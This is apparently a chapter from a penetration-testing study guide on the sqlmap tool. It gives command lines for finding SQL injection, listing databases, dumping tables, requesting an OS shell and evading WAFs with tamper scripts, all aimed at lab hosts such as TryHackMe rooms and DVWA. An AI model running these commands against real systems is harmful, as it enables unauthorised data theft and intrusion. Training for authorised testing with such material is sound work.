# Chapter 12 — Tooling: sqlmap

## About the Topic
`sqlmap` is an open-source penetration testing tool that automates
detection and exploitation of SQL injection vulnerabilities. It supports
all techniques from Ch. 06–10 (UNION, error, boolean-blind, time-blind,
OOB) across MySQL, PostgreSQL, MSSQL, Oracle, SQLite, and more.

## Installation
```bash
git clone https://github.com/sqlmapproject/sqlmap.git
cd sqlmap
python sqlmap.py --version

# Kali Linux (pre-installed)
sqlmap --version
```

## Core Workflow

```bash
# 1. Basic GET-parameter test
sqlmap -u "http://target.thm/search?cat=1"

# 2. Test with cookies (needed for session-based apps)
sqlmap -u "http://target.thm/filter?id=1" \
  --cookie="JSESSIONID=abc123"

# 3. Test a raw captured request (from Burp Suite)
sqlmap -r request.txt

# 4. List all databases
sqlmap -u "http://target.thm/search?cat=1" --dbs

# 5. List tables in a specific database
sqlmap -u "http://target.thm/search?cat=1" -D database_name --tables

# 6. Dump all data from a table
sqlmap -u "http://target.thm/search?cat=1" -D database_name -T table_name --dump

# 7. Enumerate current user, DB, and privileges
sqlmap -u "http://target.thm/search?cat=1" --current-user --current-db --privileges

# 8. Force a specific technique (B=boolean, E=error, U=union, T=time, S=stacked, Q=inline)
sqlmap -u "http://target.thm/search?cat=1" --technique=BT

# 9. Attempt OS shell (if DB user has file-write privileges)
sqlmap -u "http://target.thm/search?cat=1" --os-shell
```

## Practical Example — HTTP GET-Based Testing
```
http://sqlmaptesting.thm/search?cat=1
```
`cat` takes value `1` — a strong candidate. Capture the full request
(including cookies) from DevTools/Burp, then run:

```bash
sqlmap -u "http://sqlmaptesting.thm/search?cat=1" \
  --cookie="PHPSESSID=63mi2fd16cs...aqrdpcp7io" \
  --batch --dbs
```
`--batch` accepts all default prompts automatically (non-interactive mode)
— essential for scripted/CI use, but review defaults carefully in real
engagements.

## Offensive Tips
- Start narrow (`--dbs`) before dumping everything — noisy full dumps can
  trigger WAF/IDS alerts and blow your engagement window.
- Use `--risk=3 --level=5` for thorough testing in labs; keep these lower
  on production targets to avoid destructive payloads (stacked
  DROP/UPDATE tests).
- `--tamper` scripts (e.g., `space2comment`, `charencode`) help bypass
  weak WAFs — see Chapter 14.
- Always pass the exact cookie/session sqlmap needs, or authenticated
  endpoints will silently fail.

## Labs to Practice
- **TryHackMe** — *SQLMap: The Basics* room (full guided walkthrough:
  GET-based testing, `--dbs`, `--tables`, `--dump`, cookie-based testing).
- **PortSwigger Academy labs** — re-solve any UNION/blind lab using sqlmap
  instead of manual payloads, to compare speed/output.
- **DVWA** — sqlmap against the SQLi module with a captured session cookie.

## Key Takeaway
sqlmap doesn't replace understanding manual SQLi (Ch. 05–10) — it
automates the tedious extraction work once you already know a parameter
is injectable and roughly which technique applies.
